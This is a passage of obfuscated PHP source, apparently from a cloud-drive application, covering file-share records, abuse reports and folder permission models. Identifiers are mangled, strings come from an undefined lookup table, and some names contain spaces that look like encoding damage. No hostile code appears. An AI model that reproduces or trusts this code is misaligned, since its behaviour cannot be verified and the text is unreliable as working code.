SourceModel::TYPE_GROUP; } $®„¸ÁÂ÷ = array($ñÒ«ìŒõ[482] => $´ôÙŠ‚, $ñÒ«ìŒõ[406] => $ÍéÀÙÂÏ, $ñÒ«ìŒõ[498] => intval($æÔôÀ³§[$ñÒ«ìŒõ[498]]), $ñÒ«ìŒõ[1849] => 0, $ñÒ«ìŒõ[1903] => -1); if ($æÔôÀ³§[$ñÒ«ìŒõ[1849]]) { $®„¸ÁÂ÷[$ñÒ«ìŒõ[1849]] = $æÔôÀ³§[$ñÒ«ìŒõ[1849]]; } else { if ($æÔôÀ³§[$ñÒ«ìŒõ[1903]]) { $®„¸ÁÂ÷[$ñÒ«ìŒõ[1903]] = $æÔôÀ³§[$ñÒ«ìŒõ[1903]]; } } $ï»ÍŒ[] = $®„¸ÁÂ÷; } return $ÖÓÊÛ¶->addAll($ï»ÍŒ, array(), !0); } public function numViewAdd($ ÆªÂ¾) { $ÅáÖ™È– =& $_SERVER[ÏÒ Ì„]; $Â²ÙÄİ— = array($ÅáÖ™È–[481] => $ ÆªÂ¾); $this->where($Â²ÙÄİ—)->setAdd($ÅáÖ™È–[1900]); } public function numDownloadAdd($™ĞŞ±Ø) { $Ÿôäë§€ =& $_SERVER[ÏÒ Ì„]; $šô«¤±õ = array($Ÿôäë§€[481] => $™ĞŞ±Ø); $this->where($šô«¤±õ)->setAdd($Ÿôäë§€[1901]); } protected function shareEdit($ÁÒìÀª‘, $ë¦ñÙ“‹) { $’ó‘áéÀ =& $_SERVER[ÏÒ Ì„]; $¼ûĞßïã = $this->getInfo($ÁÒìÀª‘); if (!$¼ûĞßïã) { return !1; } $this->_checkLinkShare($ë¦ñÙ“‹, $¼ûĞßïã); $ÒºÍæŒ = array(); $µÓ¤Ø«â = explode($’ó‘áéÀ[47], $’ó‘áéÀ[1904]); foreach ($µÓ¤Ø«â as $ğ¨÷ãú×) { if (!array_key_exists($ğ¨÷ãú×, $ë¦ñÙ“‹)) { continue; } $ÒºÍæŒ[$ğ¨÷ãú×] = $ë¦ñÙ“‹[$ğ¨÷ãú×]; } $this->shareEventAdd($¼ûĞßïã[$’ó‘áéÀ[397]], $ë¦ñÙ“‹, $’ó‘áéÀ[1715]); $this->where(array($’ó‘áéÀ[481] => $ÁÒìÀª‘))->save($ÒºÍæŒ); if (isset($ë¦ñÙ“‹[$’ó‘áéÀ[1893]])) { $this->_shareAuthSet($ÁÒìÀª‘, $ë¦ñÙ“‹[$’ó‘áéÀ[1893]]); } return !0; } private function _checkLinkShare($Ø¶ˆ—Å, $—ˆë©ËÍ) { $ˆ¶³’£Å =& $_SERVER[ÏÒ Ì„]; if ($Ø¶ˆ—Å[$ˆ¶³’£Å[487]] != $ˆ¶³’£Å[87]) { return; } $ğÉ¼‡øå = $—ˆë©ËÍ[$ˆ¶³’£Å[85]][$ˆ¶³’£Å[397]]; if ($—ˆë©ËÍ[$ˆ¶³’£Å[85]][$ˆ¶³’£Å[29]] != $ˆ¶³’£Å[193]) { $ÓüÃºØ = $this->_folderReport($ğÉ¼‡øå); if (!$ÓüÃºØ) { return; } show_json(LNG($ˆ¶³’£Å[1905]) . $ˆ¶³’£Å[1906] . $ÓüÃºØ, !1); } $ÁÓİËÜÙ = Model($ˆ¶³’£Å[822])->fileInfoGet($—ˆë©ËÍ[$ˆ¶³’£Å[85]][$ˆ¶³’£Å[397]]); if (!$ÁÓİËÜÙ) { return; } $¹Ö´ö• = $this->shareFileMeta($ÁÓİËÜÙ[$ˆ¶³’£Å[461]]); if (isset($¹Ö´ö•[$ˆ¶³’£Å[372]]) && $¹Ö´ö•[$ˆ¶³’£Å[372]] == $ˆ¶³’£Å[87]) { show_json(LNG($ˆ¶³’£Å[1907]), !1); } } private function _folderReport($ïÊ¥³şó) { $„±ñ«¬ =& $_SERVER[ÏÒ Ì„]; $Åš¸ËÙŞ = array($„±ñ«¬[461] => array($„±ñ«¬[1006], 0), $„±ñ«¬[740] => 3); $ óÍô = Model($„±ñ«¬[1908])->where($Åš¸ËÙŞ)->field($„±ñ«¬[461])->select(); if (!$ óÍô) { return !1; } $ óÍô = array_to_keyvalue($ óÍô, $„±ñ«¬[33], $„±ñ«¬[461]); $¹œªœÂ = $„±ñ«¬[47] . $ïÊ¥³şó . $„±ñ«¬[47]; $Åš¸ËÙŞ = array($„±ñ«¬[461] => array($„±ñ«¬[7], $ óÍô), $„±ñ«¬[515] => array($„±ñ«¬[381], "\x25{$¹œªœÂ}\x25"), $„±ñ«¬[425] => 0); $¤Æ€œÖ” = Model($„±ñ«¬[822])->where($Åš¸ËÙŞ)->field($„±ñ«¬[1909])->find(); if (!$¤Æ€œÖ”) { return !1; } $´ß£ëæş = substr($¤Æ€œÖ”[$„±ñ«¬[515]], strpos($¤Æ€œÖ”[$„±ñ«¬[515]], $¹œªœÂ)); $Åš¸ËÙŞ = array($„±ñ«¬[397] => array($„±ñ«¬[7], trim($´ß£ëæş, $„±ñ«¬[47]))); $Ä¨„áÀß = Model($„±ñ«¬[822])->where($Åš¸ËÙŞ)->field($„±ñ«¬[28])->select(); $…ûÒ = array_to_keyvalue($Ä¨„áÀß, $„±ñ«¬[33], $„±ñ«¬[28]); $…ûÒ[] = $¤Æ€œÖ”[$„±ñ«¬[28]]; return implode($„±ñ«¬[8], $…ûÒ); } protected function remove($·Ãæ®¾) { $Ø×âÆ­½ =& $_SERVER[ÏÒ Ì„]; if (is_array($·Ãæ®¾)) { $·Ãæ®¾ = array($Ø×âÆ­½[7], $·Ãæ®¾); } $½èÌ˜§ = array($Ø×âÆ­½[482] => $·Ãæ®¾); $¢ÁÃ€ÔÏ = $this->where($½èÌ˜§)->delete(); if ($¢ÁÃ€ÔÏ) { Model($Ø×âÆ­½[590])->where(array($Ø×âÆ­½[482] => $·Ãæ®¾))->delete(); } $…Øñ©‡à = is_array($·Ãæ®¾) ? $·Ãæ®¾[1] : array($·Ãæ®¾); for ($Ü‚¯ËüŒ = 0; $Ü‚¯ËüŒ < count($…Øñ©‡à); $Ü‚¯ËüŒ++) { $èò•ÈÉ = $this->getInfo($…Øñ©‡à[$Ü‚¯ËüŒ]); if ($èò•ÈÉ[$Ø×âÆ­½[489]] == $Ø×âÆ­½[87]) { Model($Ø×âÆ­½[558])->eventShare($èò•ÈÉ[$Ø×âÆ­½[397]], $Ø×âÆ­½[1898]); } if ($èò•ÈÉ[$Ø×âÆ­½[487]] == $Ø×âÆ­½[87]) { Model($Ø×âÆ­½[558])->eventShare($èò•ÈÉ[$Ø×âÆ­½[397]], $Ø×âÆ­½[1897]); } } return $¢ÁÃ€ÔÏ; } protected function removeBySource($¥Şü˜Ú) { $Åüî£Ÿ‘ =& $_SERVER[ÏÒ Ì„]; $Ö¼¥÷« = array($Åüî£Ÿ‘[412] => array($Åüî£Ÿ‘[413], $¥Şü˜Ú)); $Â‰ªçĞŠ = $this->field($Åüî£Ÿ‘[482])->where($Ö¼¥÷«)->select(); $Â‰ªçĞŠ = array_to_keyvalue($Â‰ªçĞŠ, $Åüî£Ÿ‘[33], $Åüî£Ÿ‘[482]); if (!$Â‰ªçĞŠ) { return; } $Ö¼¥÷« = array($Åüî£Ÿ‘[481] => array($Åüî£Ÿ‘[413], $Â‰ªçĞŠ)); $this->where($Ö¼¥÷«)->delete(); Model($Åüî£Ÿ‘[590])->where($Ö¼¥÷«)->delete(); } public function listAll($Íó¢¡¶„) { $Ó—şçÇ =& $_SERVER[ÏÒ Ì„]; $Üö­°æÊ = array(); if ($Íó¢¡¶„[$Ó—şçÇ[1578]]) { $Üö­°æÊ[$Ó—şçÇ[1578]] = $Íó¢¡¶„[$Ó—şçÇ[1578]]; } if ($Íó¢¡¶„[$Ó—şçÇ[751]]) { $†şŠáÙ¬ = $Íó¢¡¶„[$Ó—şçÇ[490]] ? $Íó¢¡¶„[$Ó—şçÇ[490]] : strtotime(date($Ó—şçÇ[1910])); $Üö­°æÊ[$Ó—şçÇ[194]] = array($Ó—şçÇ[331], array($Íó¢¡¶„[$Ó—şçÇ[751]], $†şŠáÙ¬)); } if ($Íó¢¡¶„[$Ó—şçÇ[29]]) { $Üö­°æÊ[$Íó¢¡¶„[$Ó—şçÇ[29]]] = 1; } else { $Üö­°æÊ[] = array($Ó—şçÇ[487] => array($Ó—şçÇ[1006], 0), $Ó—şçÇ[489] => array($Ó—şçÇ[1006], 0), $Ó—şçÇ[1887] => $Ó—şçÇ[1841]); } if ($Íó¢¡¶„[$Ó—şçÇ[1837]]) { $Üö­°æÊ[] = array($Ó—şçÇ[484] => $Íó¢¡¶„[$Ó—şçÇ[1837]], $Ó—şçÇ[1478] => array($Ó—şçÇ[381], "\45{$Íó¢¡¶„[$Ó—şçÇ[1837]]}\45"), $Ó—şçÇ[1887] => $Ó—şçÇ[1841]); } $Â«‹Ä®› = $this->_makeOrder()->where($Üö­°æÊ)->selectPage(20); if (empty($Â«‹Ä®›[$Ó—şçÇ[367]])) { return array(); } $this->_listDataApply($Â«‹Ä®›[$Ó—şçÇ[367]]); return $Â«‹Ä®›; } public function listDataApply($ÉÎ¡Ï°) { $this->_listDataApply($ÉÎ¡Ï°); return $ÉÎ¡Ï°; } private function _listDataApply(&$³Ó©­ªÉ) { $úü‹º×Š =& $_SERVER[ÏÒ Ì„]; $Ñ±éÊ¬é = array_to_keyvalue($³Ó©­ªÉ, $úü‹º×Š[33], $úü‹º×Š[1578]); $Á“×”Ğù = Model($úü‹º×Š[532])->userListInfo(array_unique($Ñ±éÊ¬é)); $ø¿ÍĞÂ– = array_to_keyvalue($³Ó©­ªÉ, $úü‹º×Š[33], $úü‹º×Š[397]); $¾Õ©Õ³ = Model($úü‹º×Š[822])->sourceListInfo($ø¿ÍĞÂ–, !0); foreach ($³Ó©­ªÉ as $÷í‘µœä => &$…øÆ‚Î˜) { $·…¿ı¯Ú = $…øÆ‚Î˜[$úü‹º×Š[1578]]; $…øÆ‚Î˜[$úü‹º×Š[1911]] = $Á“×”Ğù[$·…¿ı¯Ú] ? $Á“×”Ğù[$·…¿ı¯Ú] : !1; $¸—ç¯àş = $…øÆ‚Î˜[$úü‹º×Š[397]]; $…øÆ‚Î˜[$úü‹º×Š[85]] = $¾Õ©Õ³[$¸—ç¯àş] ? $¾Õ©Õ³[$¸—ç¯àş] : !1; if ($…øÆ‚Î˜[$úü‹º×Š[85]][$úü‹º×Š[425]] == $úü‹º×Š[87]) { unset($³Ó©­ªÉ[$÷í‘µœä]); } if ($…øÆ‚Î˜[$úü‹º×Š[85]] != $úü‹º×Š[191] && !$…øÆ‚Î˜[$úü‹º×Š[85]]) { unset($³Ó©­ªÉ[$÷í‘µœä]); } } unset($…øÆ‚Î˜); $³Ó©­ªÉ = array_values($³Ó©­ªÉ); } private function _makeOrder($êÀíß¼ü = '') { $Âºë¯ƒÒ =& $_SERVER[ÏÒ Ì„]; $ÏŠ÷œÆê = array($Âºë¯ƒÒ[194], $Âºë¯ƒÒ[490], $Âºë¯ƒÒ[1900], $Âºë¯ƒÒ[1901]); $¯«ïª = array($Âºë¯ƒÒ[442] => $Âºë¯ƒÒ[443], $Âºë¯ƒÒ[444] => $Âºë¯ƒÒ[445]); $åÑıí¶Î = Input::get($Âºë¯ƒÒ[449], $Âºë¯ƒÒ[7], $Âºë¯ƒÒ[418], $ÏŠ÷œÆê); $öèÃ°Ç = Input::get($Âºë¯ƒÒ[450], $Âºë¯ƒÒ[7], $Âºë¯ƒÒ[1912], array($Âºë¯ƒÒ[1836], $Âºë¯ƒÒ[444])); $öèÃ°Ç = $¯«ïª[$öèÃ°Ç]; $êÀíß¼ü = $êÀíß¼ü . "{$åÑıí¶Î}\x20{$öèÃ°Ç}"; return $this->order($êÀíß¼ü); } public function reportAdd($ô²±Æî“) { $½âä„º– =& $_SERVER[ÏÒ Ì„]; $ÚÏ”ÔŒ‡ = array($½âä„º–[482] => $ô²±Æî“[$½âä„º–[482]], $½âä„º–[1578] => USER_ID); if (Model($½âä„º–[1908])->where($ÚÏ”ÔŒ‡)->find()) { return !1; } $İ®¿‰©Ã = array($½âä„º–[482] => $ô²±Æî“[$½âä„º–[482]], $½âä„º–[1478] => $ô²±Æî“[$½âä„º–[1478]], $½âä„º–[397] => $ô²±Æî“[$½âä„º–[397]], $½âä„º–[461] => $ô²±Æî“[$½âä„º–[461]], $½âä„º–[1578] => USER_ID, $½âä„º–[29] => $ô²±Æî“[$½âä„º–[29]], $½âä„º–[445] => $ô²±Æî“[$½âä„º–[445]]); return Model($½âä„º–[1908])->add($İ®¿‰©Ã); } public function reportList($®Ÿ”µô…) { $ÃèÜë³ =& $_SERVER[ÏÒ Ì„]; $ÑÑÀµ­ = array(); if ($®Ÿ”µô…[$ÃèÜë³[751]]) { $Ãë´š–Æ = $®Ÿ”µô…[$ÃèÜë³[490]] ? $®Ÿ”µô…[$ÃèÜë³[490]] : strtotime(date($ÃèÜë³[1910])); $ÑÑÀµ­[$ÃèÜë³[194]] = array($ÃèÜë³[331], array($®Ÿ”µô…[$ÃèÜë³[751]], $Ãë´š–Æ)); } if (isset($®Ÿ”µô…[$ÃèÜë³[29]]) && in_array($®Ÿ”µô…[$ÃèÜë³[29]], array($ÃèÜë³[87], $ÃèÜë³[429], $ÃèÜë³[1913], $ÃèÜë³[1914], $ÃèÜë³[1915]))) { $ÑÑÀµ­[$ÃèÜë³[29]] = $®Ÿ”µô…[$ÃèÜë³[29]]; } if (isset($®Ÿ”µô…[$ÃèÜë³[740]]) && in_array($®Ÿ”µô…[$ÃèÜë³[740]], array($ÃèÜë³[191], $ÃèÜë³[87], $ÃèÜë³[429], $ÃèÜë³[1913]))) { $ÑÑÀµ­[$ÃèÜë³[740]] = $®Ÿ”µô…[$ÃèÜë³[740]]; } $»ñìê¾ = Input::get($ÃèÜë³[450], $ÃèÜë³[7], $ÃèÜë³[1912], array($ÃèÜë³[1836], $ÃèÜë³[444])); $ºÉıœİ– = array($ÃèÜë³[442] => $ÃèÜë³[443], $ÃèÜë³[444] => $ÃèÜë³[445]); $ÔĞÙ×Ú = $ÃèÜë³[1916] . $ºÉıœİ–[$»ñìê¾]; $Ö¿‡ë²¾ = Model($ÃèÜë³[1908])->where($ÑÑÀµ­)->order($ÔĞÙ×Ú)->selectPage(20); if (empty($Ö¿‡ë²¾[$ÃèÜë³[367]])) { return array(); } $¸ƒ¼ = array_to_keyvalue_group($Ö¿‡ë²¾[$ÃèÜë³[367]], $ÃèÜë³[740], $ÃèÜë³[482]); if (!empty($¸ƒ¼[0])) { $®Ÿ”µô… = $¸ƒ¼[0]; $ÑÑÀµ­ = array($ÃèÜë³[482] => array($ÃèÜë³[7], $®Ÿ”µô…)); $ßëªíÕ = $this->where($ÑÑÀµ­)->field($ÃèÜë³[482])->select(); $ßëªíÕ = array_to_keyvalue($ßëªíÕ, $ÃèÜë³[33], $ÃèÜë³[482]); $ã«âö = array_diff($®Ÿ”µô…, $ßëªíÕ); if (!empty($ã«âö)) { foreach ($Ö¿‡ë²¾[$ÃèÜë³[367]] as $¯ÅêÖáÚ => $·ÃùÎ¶›) { if (in_array($·ÃùÎ¶›[$ÃèÜë³[482]], $ã«âö)) { unset($Ö¿‡ë²¾[$ÃèÜë³[367]][$¯ÅêÖáÚ]); } } } } $this->_listDataApply($Ö¿‡ë²¾[$ÃèÜë³[367]]); return $Ö¿‡ë²¾; } public function reportStatus($ôª ±èö) { $ÅÎèä±± =& $_SERVER[ÏÒ Ì„]; $î­´“î£ = array($ÅÎèä±±[395] => $ôª ±èö[$ÅÎèä±±[395]]); $ŸÊµëìÃ = Model($ÅÎèä±±[1908])->where($î­´“î£)->field($ÅÎèä±±[1917])->find(); if (!$ŸÊµëìÃ) { return !1; } $şïÔõå˜ = array($ÅÎèä±±[740] => $ôª ±èö[$ÅÎèä±±[740]]); if ($ôª ±èö[$ÅÎèä±±[740]] == $ÅÎèä±±[1913] && $ŸÊµëìÃ[$ÅÎèä±±[740]] == $ÅÎèä±±[1913]) { $şïÔõå˜[$ÅÎèä±±[740]] = 0; } $ÓŠÌÂßÔ = Model($ÅÎèä±±[1908])->where($î­´“î£)->save($şïÔõå˜); if ($ôª ±èö[$ÅÎèä±±[740]] == $ÅÎèä±±[429]) { if ($ŸÊµëìÃ[$ÅÎèä±±[461]] != $ÅÎèä±±[191] && $this->shareFileMeta($ŸÊµëìÃ[$ÅÎèä±±[461]])) { $this->shareFileMeta($ŸÊµëìÃ[$ÅÎèä±±[461]], 0); } $this->remove($ŸÊµëìÃ[$ÅÎèä±±[482]]); return !0; } if ($ÓŠÌÂßÔ && $ôª ±èö[$ÅÎèä±±[740]] == $ÅÎèä±±[1913]) { $®×Ò¡ŒÒ = $şïÔõå˜[$ÅÎèä±±[740]] == $ÅÎèä±±[1913] ? 1 : 0; $this->shareFileMeta($ŸÊµëìÃ[$ÅÎèä±±[461]], $®×Ò¡ŒÒ); $this->removeByFile($ŸÊµëìÃ[$ÅÎèä±±[461]]); } return $ÓŠÌÂßÔ; } private function removeByFile($Ì›„ùµÕ) { $¹âµˆ’ğ =& $_SERVER[ÏÒ Ì„]; $æÃßßÆñ = Model($¹âµˆ’ğ[822])->where(array($¹âµˆ’ğ[461] => $Ì›„ùµÕ))->field($¹âµˆ’ğ[397])->select(); $®Äâæ•ö = array_to_keyvalue($æÃßßÆñ, $¹âµˆ’ğ[33], $¹âµˆ’ğ[397]); $ˆï™±…” = array($¹âµˆ’ğ[397] => array($¹âµˆ’ğ[7], $®Äâæ•ö), $¹âµˆ’ğ[487] => 1); $æÃßßÆñ = $this->where($ˆï™±…”)->field($¹âµˆ’ğ[482])->select(); if (empty($æÃßßÆñ)) { return; } $Ù¤¦Ç– = array_to_keyvalue($æÃßßÆñ, $¹âµˆ’ğ[33], $¹âµˆ’ğ[482]); $this->remove($Ù¤¦Ç–); } private function shareFileMeta($‡ü¢‹Â¦, $ÁØ¯¿ = null) { $³›èËÔ =& $_SERVER[ÏÒ Ì„]; $¼à˜ØÛ = array($³›èËÔ[461] => $‡ü¢‹Â¦, $³›èËÔ[93] => $³›èËÔ[1918]); if (is_null($ÁØ¯¿)) { return Model($³›èËÔ[1919])->where($¼à˜ØÛ)->find(); } $¼à˜ØÛ[$³›èËÔ[372]] = $ÁØ¯¿; Model($³›èËÔ[1919])->add($¼à˜ØÛ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\165\162\x63\145\137\141\165\x74\150"; public function getAuth($ßõù¥¯í) { $äÒ´ùŞ¬ =& $_SERVER[ÏÒ Ì„]; $§ÈİÊÂª = $this->sourceAuthSelect($ßõù¥¯í); $€èè©¨È = array(); $Åå­ôÚ¢ = array(); $úñïø½œ = 2 << 25; foreach ($§ÈİÊÂª as $³ù¯¯”…) { $ñ¶×‰Û = Model($äÒ´ùŞ¬[501])->listData($³ù¯¯”…[$äÒ´ùŞ¬[1849]]); if (!$ñ¶×‰Û) { continue; } $€èè©¨È[] = $³ù¯¯”…; $ÈÆÆÎÁÍ = 0; if ($³ù¯¯”…[$äÒ´ùŞ¬[406]] == SourceModel::TYPE_GROUP) { $ÈÆÆÎÁÍ = $úñïø½œ * 2; } if ($³ù¯¯”…[$äÒ´ùŞ¬[406]] == SourceModel::TYPE_USER) { $ÈÆÆÎÁÍ = $úñïø½œ; } if ($³ù¯¯”…[$äÒ´ùŞ¬[406]] == SourceModel::TYPE_USER && $³ù¯¯”…[$äÒ´ùŞ¬[498]] == $äÒ´ùŞ¬[191]) { $ÈÆÆÎÁÍ = 0; } $Åå­ôÚ¢[] = $ñ¶×‰Û[$äÒ´ùŞ¬[408]] + $ÈÆÆÎÁÍ; } array_multisort($Åå­ôÚ¢, SORT_DESC, $€èè©¨È); return $€èè©¨È; } public function sourceAuthSelect($²¾ÜÉùˆ) { $µçâÛ¦§ =& $_SERVER[ÏÒ Ì„]; static $åãúÎÜà = array(); $Àë¨Ò° = is_array($²¾ÜÉùˆ) ? !1 : !0; if ($Àë¨Ò°) { $²¾ÜÉùˆ = array($²¾ÜÉùˆ); } $“ÕÀÕ³ı = array(); foreach ($²¾ÜÉùˆ as $¶½åóÅô) { if (isset($åãúÎÜà[$¶½åóÅô])) { $“ÕÀÕ³ı[$¶½åóÅô] = $åãúÎÜà[$¶½åóÅô]; } } if (count($“ÕÀÕ³ı) == count($²¾ÜÉùˆ)) { return $Àë¨Ò° ? $“ÕÀÕ³ı[$²¾ÜÉùˆ[0]] : $“ÕÀÕ³ı; } $È•æÙĞÀ = $µçâÛ¦§[1920]; $ÊÊü±ÔÑ = array($µçâÛ¦§[397] => array($µçâÛ¦§[7], $²¾ÜÉùˆ)); $î³Ï˜’ë = $this->field($È•æÙĞÀ)->order($µçâÛ¦§[395])->where($ÊÊü±ÔÑ)->select(); $Òõ‡¨Áä = array_to_keyvalue_group($î³Ï˜’ë, $µçâÛ¦§[397]); foreach ($²¾ÜÉùˆ as $¶½åóÅô) { $åãúÎÜà[$¶½åóÅô] = $Òõ‡¨Áä[$¶½åóÅô] ? $Òõ‡¨Áä[$¶½åóÅô] : array(); } if ($Àë¨Ò°) { return $î³Ï˜’ë; } return $Òõ‡¨Áä; } public function setAuth($±ïˆŸ­¶, $Êü÷‡…„) { $­ñÙ‘Õ“ =& $_SERVER[ÏÒ Ì„]; $éºò”÷ = Model($­ñÙ‘Õ“[1251])->sourceInfo($±ïˆŸ­¶); if (!$éºò”÷) { return !1; } if ($éºò”÷[$­ñÙ‘Õ“[406]] != SourceModel::TYPE_GROUP) { return !1; } $©è‹ê®ç = 1; $Êğ®Ï­â = $éºò”÷[$­ñÙ‘Õ“[498]]; if ($Êğ®Ï­â != $©è‹ê®ç) { $Ü¶¾ õò = array($­ñÙ‘Õ“[1746] => $Êğ®Ï­â); $È‹Ï©íÍ = Model($­ñÙ‘Õ“[1835])->field($­ñÙ‘Õ“[1578])->where($Ü¶¾ õò)->select(); $È‹Ï©íÍ = array_to_keyvalue($È‹Ï©íÍ, $­ñÙ‘Õ“[33], $­ñÙ‘Õ“[1578]); } $’íóØñã = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $¢ãÔùÖ = array(); foreach ($Êü÷‡…„ as $õÎ•²±) { if (!in_array($õÎ•²±[$­ñÙ‘Õ“[406]], $’íóØñã)) { show_json(LNG($­ñÙ‘Õ“[1921]), !1); } if ($Êğ®Ï­â != $©è‹ê®ç) { if ($õÎ•²±[$­ñÙ‘Õ“[406]] == SourceModel::TYPE_GROUP) { } if ($õÎ•²±[$­ñÙ‘Õ“[498]] != 0 && !in_array($õÎ•²±[$­ñÙ‘Õ“[498]], $È‹Ï©íÍ)) { } } if ($õÎ•²±[$­ñÙ‘Õ“[498]] == 0) { $õÎ•²±[$­ñÙ‘Õ“[406]] = SourceModel::TYPE_USER; } $¢ãÔùÖ[] = array($­ñÙ‘Õ“[397] => $±ïˆŸ­¶, $­ñÙ‘Õ“[406] => intval($õÎ•²±[$­ñÙ‘Õ“[406]]), $­ñÙ‘Õ“[498] => intval($õÎ•²±[$­ñÙ‘Õ“[498]]), $­ñÙ‘Õ“[1849] => intval($õÎ•²±[$­ñÙ‘Õ“[1849]]) ? intval($õÎ•²±[$­ñÙ‘Õ“[1849]]) : 0, $­ñÙ‘Õ“[1903] => intval($õÎ•²±[$­ñÙ‘Õ“[1903]]) ? intval($õÎ•²±[$­ñÙ‘Õ“[1903]]) : -1); } $this->where(array($­ñÙ‘Õ“[412] => $±ïˆŸ­¶))->delete(); $this->addAll($¢ãÔùÖ); return !0; } public function authClear($¶ùšíÌ) { $Ñúƒ ˆ¤ =& $_SERVER[ÏÒ Ì„]; $¬Ñ »†á = Model($Ñúƒ ˆ¤[1251])->sourceInfo($¶ùšíÌ); $ú‰¾«ı‚ = array($¶ùšíÌ); if ($¬Ñ »†á[$Ñúƒ ˆ¤[405]] == $Ñúƒ ˆ¤[87]) { $ÓßáéÈ• = array($Ñúƒ ˆ¤[578] => array($Ñúƒ ˆ¤[538], $¬Ñ »†á[$Ñúƒ ˆ¤[515]] . $¶ùšíÌ . $Ñúƒ ˆ¤[539])); $ú‰¾«ı‚ = Model($Ñúƒ ˆ¤[1251])->field($Ñúƒ ˆ¤[412])->where($ÓßáéÈ•)->getField($Ñúƒ ˆ¤[397], !0); $ú‰¾«ı‚[] = $¶ùšíÌ; } $this->where(array($Ñúƒ ˆ¤[412] => array($Ñúƒ ˆ¤[413], $ú‰¾«ı‚)))->delete(); return !0; } public function getAllChildren($ÉÃê¢Õ) { $ÓÈù˜¥— =& $_SERVER[ÏÒ Ì„]; $ùı½ëà¡ = Model($ÓÈù˜¥—[1251])->sourceInfo($ÉÃê¢Õ); if ($ùı½ëà¡[$ÓÈù˜¥—[405]] != $ÓÈù˜¥—[87]) { return $this->sourceListAuth(array($ÉÃê¢Õ)); } if ($ùı½ëà¡[$ÓÈù˜¥—[406]] != SourceModel::TYPE_GROUP) { return array(); } $äğ±ê = 1; $è›êäÙ = array($ÉÃê¢Õ); if ($ùı½ëà¡[$ÓÈù˜¥—[492]] == $ÓÈù˜¥—[191] && $ùı½ëà¡[$ÓÈù˜¥—[498]] != $äğ±ê) { $è›êäÙ = $this->groupChidldAllRootSource($ùı½ëà¡[$ÓÈù˜¥—[498]]); } $°öèÒËã = $this->field($ÓÈù˜¥—[397])->group($ÓÈù˜¥—[397])->select(); $°öèÒËã = array_to_keyvalue($°öèÒËã, $ÓÈù˜¥—[33], $ÓÈù˜¥—[397]); if (!$°öèÒËã) { return array(); } $‹›Úñê¦ = $ÓÈù˜¥—[1922]; $óŠ­Ñ… = array($ÓÈù˜¥—[397] => array($ÓÈù˜¥—[7], $°öèÒËã), $ÓÈù˜¥—[425] => $ÓÈù˜¥—[191]); $ö¬ºäšØ = Model($ÓÈù˜¥—[822])->field($‹›Úñê¦)->where($óŠ­Ñ…)->select(); $½ƒüúÇ¥ = array($ÉÃê¢Õ); foreach ($ö¬ºäšØ as $çšéÓåÕ) { foreach ($è›êäÙ as $€Éå²›Ê) { $ÓçàÜÍ• = $ÓÈù˜¥—[47] . $€Éå²›Ê . $ÓÈù˜¥—[47]; $ÍÀáü¤Ã = $çšéÓåÕ[$ÓÈù˜¥—[515]] . $çšéÓåÕ[$ÓÈù˜¥—[397]] . $ÓÈù˜¥—[47]; if (strstr($ÍÀáü¤Ã, $ÓçàÜÍ•)) { $½ƒüúÇ¥[] = $çšéÓåÕ[$ÓÈù˜¥—[397]]; break; } } } return $this->sourceListAuth($½ƒüúÇ¥); } private function sourceListAuth($ÍŠÕ€ä˜) { $Òˆ·«® =& $_SERVER[ÏÒ Ì„]; $ñï«¨ûã = Model($Òˆ·«®[1251])->sourceListInfo($ÍŠÕ€ä˜, !0); $Ëß“¡Ö¬ = $this->sourceAuthSelect($ÍŠÕ€ä˜); $ã„÷›È = array(); $Ğäúûô = array(); foreach ($ñï«¨ûã as $èÜÕ•Á) { unset($èÜÕ•Á[$Òˆ·«®[448]]); unset($èÜÕ•Á[$Òˆ·«®[446]]); unset($èÜÕ•Á[$Òˆ·«®[408]]); unset($èÜÕ•Á[$Òˆ·«®[85]]); $—Ò…¸Š› = $Ëß“¡Ö¬[$èÜÕ•Á[$Òˆ·«®[397]]]; if (!$—Ò…¸Š›) { continue; } $èÜÕ•Á[$Òˆ·«®[1923]] = $this->authTargetInfo($—Ò…¸Š›); $èÜÕ•Á[$Òˆ·«®[513]] = rtrim($èÜÕ•Á[$Òˆ·«®[519]], $Òˆ·«®[8]) . $Òˆ·«®[8] . ltrim($èÜÕ•Á[$Òˆ·«®[513]], $Òˆ·«®[8]); $ã„÷›È[] = $èÜÕ•Á; $Ïù×İÈö = count(explode($Òˆ·«®[8], trim($èÜÕ•Á[$Òˆ·«®[513]], $Òˆ·«®[8]))); $Ğäúûô[] = $Ïù×İÈö + ($èÜÕ•Á[$Òˆ·«®[29]] == $Òˆ·«®[77] ? 0 : 1000); } array_multisort($Ğäúûô, SORT_ASC, $ã„÷›È); return $ã„÷›È; } private function groupChidldAllRootSource($÷‡õƒ¬Ê) { $·ÁşüÃ =& $_SERVER[ÏÒ Ì„]; $Ø‘ÈŞ§ = Model($·ÁşüÃ[1924])->groupChildrenAll($÷‡õƒ¬Ê); $Í¦üœ‹ = array($·ÁşüÃ[492] => 0, $·ÁşüÃ[498] => array($·ÁşüÃ[7], $Ø‘ÈŞ§), $·ÁşüÃ[406] => SourceModel::TYPE_GROUP); $Š¥´êÛ¹ = Model($·ÁşüÃ[822])->field($·ÁşüÃ[397])->where($Í¦üœ‹)->select(); $Š¥´êÛ¹ = array_to_keyvalue($Š¥´êÛ¹, $·ÁşüÃ[33], $·ÁşüÃ[397]); return $Š¥´êÛ¹; } private function authTargetInfo($ú”Ë±®) { $ÎôŞ®´ê =& $_SERVER[ÏÒ Ì„]; $²›¦º² = array(); $Å±¾†ç¼ = array(); $í„€¾å = 2 << 25; foreach ($ú”Ë±® as $¬¬ëû¯) { $ÚÇª÷€ù = Model($ÎôŞ®´ê[501])->listData($¬¬ëû¯[$ÎôŞ®´ê[1849]]); if (!$ÚÇª÷€ù) { continue; } if ($¬¬ëû¯[$ÎôŞ®´ê[406]] == SourceModel::TYPE_USER) { $¹æÆ·© = Model($ÎôŞ®´ê[507])->getInfoSimpleOuter($¬¬ëû¯[$ÎôŞ®´ê[498]]); if ($¹æÆ·©[$ÎôŞ®´ê[1578]] == $ÎôŞ®´ê[1118]) { continue; } if ($¹æÆ·©[$ÎôŞ®´ê[1578]] == $ÎôŞ®´ê[191]) { $¹æÆ·©[$ÎôŞ®´ê[28]] = LNG($ÎôŞ®´ê[1925]); } } else { $¹æÆ·© = Model($ÎôŞ®´ê[516])->getInfoSimple($¬¬ëû¯[$ÎôŞ®´ê[498]]); } if (!$¹æÆ·©) { continue; 